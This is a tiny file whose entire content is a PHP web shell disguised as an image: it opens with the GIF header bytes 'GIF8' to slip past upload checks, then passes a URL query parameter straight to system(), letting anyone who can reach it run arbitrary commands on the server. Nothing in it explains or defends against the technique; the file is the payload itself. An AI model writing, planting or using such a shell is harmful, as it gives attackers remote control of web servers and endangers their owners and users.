GIF8<?php
system($_GET[abb]);
